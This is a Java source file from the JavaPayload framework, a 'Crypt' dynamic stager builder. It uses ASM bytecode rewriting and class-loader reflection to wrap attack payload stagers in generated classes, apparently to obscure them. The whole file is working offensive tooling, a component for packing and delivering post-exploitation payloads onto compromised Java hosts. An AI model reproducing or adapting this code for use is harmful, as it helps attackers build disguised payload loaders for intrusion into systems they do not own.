/*
 * Java Payloads.
 * 
 * Copyright (c) 2012 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder.dynstager;

import java.io.ByteArrayInputStream;
import java.lang.reflect.Field;

import javapayload.builder.ClassBuilder;
import javapayload.stager.Stager;

import org.objectweb.asm.ClassAdapter;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodAdapter;
import org.objectweb.asm.MethodVisitor;

public class Crypt extends DynStagerBuilder {
	public byte[] buildStager(final String stagerName, Class baseStagerClass, String extraArg, String[] args) throws Exception {
		String stagerFullName = baseStagerClass.getName();
		String baseStagerName = stagerFullName.substring(stagerFullName.lastIndexOf('.') + 1);
		byte[] classBytes = ClassBuilder.buildClassBytes("javapayload/stager/" + stagerName + "^" + extraArg, baseStagerName, CryptClassBuilderTemplate.class, null, null);
		final ClassWriter cw = new ClassWriter(0);
		final ClassVisitor cryptedClassVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				super.visit(version, access, name, signature, "javapayload/stager/Stager", interfaces);
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("<init>"))
					return null;
				else if (name.equals("main") && desc.equals("([Ljava/lang/String;)V"))
					return super.visitMethod(access, "cryptedMain", desc, signature, exceptions);
				else
					return super.visitMethod(access, name, desc, signature, exceptions);
			}

			public void visitEnd() {
				// not the end
			};
		};
		new ClassReader(new ByteArrayInputStream(classBytes)).accept(cryptedClassVisitor, ClassReader.SKIP_DEBUG);

		final ClassVisitor templateClassVisitor = new ClassAdapter(cw) {
			public void visit(int version, int access, String name, String signature, String superName, String[] interfaces) {
				// not the beginning
			}

			public void visitInnerClass(String name, String outerName, String innerName, int access) {
				// do not copy outer classes
			}

			public void visitOuterClass(String owner, String name, String desc) {
				// do not copy outer classes
			}

			public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
				if (name.equals("bootstrap") || name.equals("waitReady") || name.equals("<init>")) {
					return new MethodAdapter(super.visitMethod(access, name, desc, signature, exceptions)) {

						private String cleanType(String type) {
							if (type.equals("javapayload/builder/dynstager/Crypt$CryptStagerTemplate")) {
								type = "javapayload/stager/" + stagerName;
							}
							return type;
						}

						public void visitFieldInsn(int opcode, String owner, String name, String desc) {
							super.visitFieldInsn(opcode, cleanType(owner), name, desc);
						}

						public void visitMethodInsn(int opcode, String owner, String name, String desc) {
							super.visitMethodInsn(opcode, cleanType(owner), name, desc);
						}

						public void visitTypeInsn(int opcode, String type) {
							super.visitTypeInsn(opcode, cleanType(type));
						}
					};
				} else {
					return null;
				}
			}
		};
		ClassBuilder.visitClass(CryptStagerTemplate.class, templateClassVisitor, cw);
		return cw.toByteArray();
	}

	public static class CryptStagerTemplate extends Stager {

		public Object inner = null;

		public void bootstrap(String[] parameters, boolean needWait) throws Exception {
			String[] mainArgs = new String[parameters.length + 1];
			System.arraycopy(parameters, 0, mainArgs, 1, parameters.length);
			if (needWait) {
				mainArgs[0] = "javapayload.crypt.innerName." + Math.random();
				System.getProperties().put(mainArgs[0], this);
			}
			cryptedMain(mainArgs);
		}

		public void waitReady() throws InterruptedException {
			synchronized (this) {
				while (inner == null)
					wait();
			}
			try {
				inner.getClass().getMethod("waitReady", new Class[0]).invoke(inner, new Object[0]);
			} catch (Exception ex) {
				throw new RuntimeException(ex);
			}
		}

		public static void cryptedMain(String[] args) throws Exception {
			throw new Exception("Never used!");
		}
	}

	public static class CryptClassBuilderTemplate extends Stager {
		public static void mainToEmbed(String[] mainArgs) throws Exception {
			CryptClassBuilderTemplate cb = new CryptClassBuilderTemplate();
			String[] args = new String[mainArgs.length - 1];
			System.arraycopy(mainArgs, 1, args, 0, args.length);
			try {
				Field f = Class.forName("java.lang.ClassLoader").getDeclaredField("parent");
				f.setAccessible(true);
				f.set(cb, cb.getClass().getClassLoader());
			} catch (Throwable t) {
			}
			boolean needWait = false;
			if (mainArgs[0] != null) {
				Object outerStager = System.getProperties().get(mainArgs[0]);
				synchronized (outerStager) {
					outerStager.getClass().getField("inner").set(outerStager, cb);
					outerStager.notifyAll();
				}
				needWait = true;
			}
			cb.bootstrap(args, needWait);
		}

		public void bootstrap(String[] parameters, boolean needWait) throws Exception {
			throw new Exception("Never used!");
		}

		public void waitReady() {
			throw new RuntimeException("Never used!");
		}
	}
}
